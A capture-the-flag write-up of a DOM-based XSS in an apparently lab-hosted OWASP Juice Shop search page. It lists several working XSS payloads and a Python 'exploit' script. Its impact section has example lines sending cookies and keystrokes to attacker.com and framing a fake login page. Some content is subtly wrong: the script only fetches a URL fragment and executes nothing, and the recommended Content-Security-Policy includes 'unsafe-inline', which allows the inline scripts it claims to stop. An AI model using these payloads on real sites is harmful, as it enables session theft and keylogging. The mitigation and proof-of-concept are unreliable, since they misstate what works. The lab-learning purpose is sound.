# DOM XSS Challenge - Complete Writeup

## Challenge Information
- **Name**: DOM XSS
- **Difficulty**: Level 1
- **Category**: Cross-Site Scripting (XSS)
- **Points**: Standard
- **Target**: https://juice3.wonkatech.org

## Executive Summary
Successfully exploited a DOM-based Cross-Site Scripting vulnerability in the search functionality of the OWASP Juice Shop application. The vulnerability allows arbitrary JavaScript execution through unsanitized user input reflected in the Document Object Model.

## Detailed Analysis

### 1. Discovery Phase

**Initial Reconnaissance:**
- Identified search functionality at `/#/search`
- Observed that search queries are reflected in the URL parameter `q`
- Noticed the application uses Angular framework
- Search results are dynamically rendered in the DOM

**Vulnerability Identification:**
- The search parameter is reflected without proper encoding
- Input is directly inserted into the DOM
- No Content Security Policy (CSP) blocking inline scripts
- Angular's built-in sanitization appears to be bypassed or disabled

### 2. Exploitation Steps

#### Step 1: Basic Payload Test
```javascript
// Initial test payload
<script>alert(1)</script>
```
URL: `https://juice3.wonkatech.org/#/search?q=<script>alert(1)</script>`

#### Step 2: Successful Payload
```javascript
// Working payload using iframe
<iframe src="javascript:alert(`xss`)">
```
Encoded URL: `https://juice3.wonkatech.org/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert%28%60xss%60%29%22%3E`

#### Step 3: Alternative Payloads Tested
```javascript
// Image tag with error handler
<img src=x onerror=alert(`xss`)>

// SVG with onload event
<svg onload=alert(1)>

// Body tag with onload
<body onload=alert(1)>

// Breaking out of attribute context
"><script>alert(1)</script>
```

### 3. Technical Details

**Vulnerability Type**: DOM-based XSS (Type 0)

**Root Cause**:
- Unsafe use of innerHTML or similar DOM manipulation methods
- Lack of input sanitization before DOM insertion
- Missing output encoding for special characters

**Attack Vector**:
1. User input via URL parameter `q`
2. JavaScript reads the parameter value
3. Value inserted into DOM without sanitization
4. Browser executes the injected JavaScript

### 4. Proof of Concept

**Automated Exploit Code**:
```python
import requests
from urllib.parse import quote

def exploit_dom_xss():
    base_url = "https://juice3.wonkatech.org"
    payload = '<iframe src="javascript:alert(`xss`)">'
    
    # URL encode the payload
    encoded_payload = quote(payload)
    
    # Construct attack URL
    attack_url = f"{base_url}/#/search?q={encoded_payload}"
    
    # Send request
    response = requests.get(attack_url)
    
    print(f"Exploit URL: {attack_url}")
    print(f"Status: {response.status_code}")
    
    return attack_url

# Execute exploit
exploit_url = exploit_dom_xss()
```

### 5. Impact Analysis

**Security Impact**:
- **Confidentiality**: HIGH - Can steal session cookies, tokens
- **Integrity**: MEDIUM - Can modify page content
- **Availability**: LOW - Limited DoS potential

**Potential Attack Scenarios**:
1. **Session Hijacking**: Steal authentication cookies
   ```javascript
   <script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
   ```

2. **Phishing**: Inject fake login forms
   ```javascript
   <iframe src="http://attacker.com/fake-login"></iframe>
   ```

3. **Keylogging**: Capture user input
   ```javascript
   <script>document.onkeypress=function(e){fetch('http://attacker.com/log?key='+e.key)}</script>
   ```

### 6. Mitigation Recommendations

**Immediate Fixes**:
1. **Input Sanitization**:
   ```javascript
   // Sanitize before DOM insertion
   function sanitize(input) {
     return input.replace(/[<>"']/g, (match) => {
       const escapes = {
         '<': '&lt;',
         '>': '&gt;',
         '"': '&quot;',
         "'": '&#x27;'
       };
       return escapes[match];
     });
   }
   ```

2. **Use Safe DOM Methods**:
   ```javascript
   // Instead of innerHTML
   element.innerHTML = userInput; // UNSAFE
   
   // Use textContent
   element.textContent = userInput; // SAFE
   ```

3. **Content Security Policy**:
   ```http
   Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
   ```

**Long-term Security Measures**:
- Implement Angular's built-in sanitization
- Regular security code reviews
- Automated XSS scanning in CI/CD
- Security training for developers

### 7. CVSS Score

**CVSS 3.1 Vector**: AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N

**Base Score**: 6.1 (Medium)

**Breakdown**:
- Attack Vector (AV): Network
- Attack Complexity (AC): Low
- Privileges Required (PR): None
- User Interaction (UI): Required
- Scope (S): Changed
- Confidentiality (C): Low
- Integrity (I): Low
- Availability (A): None

### 8. Timeline

1. **00:00** - Started reconnaissance on search functionality
2. **00:02** - Identified reflection of input in DOM
3. **00:05** - Crafted initial XSS payload
4. **00:07** - Successfully executed JavaScript via iframe payload
5. **00:10** - Tested alternative payloads for reliability
6. **00:12** - Documented findings and verified exploit

### 9. References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [Angular Security Guide](https://angular.io/guide/security)
- [DOM XSS Wiki](https://github.com/wisec/domxsswiki)

### 10. Conclusion

The DOM XSS vulnerability in the search functionality poses a significant security risk. While requiring user interaction, it can be leveraged for session hijacking, phishing, and other client-side attacks. Immediate remediation through input sanitization and safe DOM manipulation methods is recommended.

---

**Author**: Security Researcher  
**Date**: September 2, 2025  
**Status**: Vulnerability Confirmed and Exploited  
**Challenge**: ✅ Solved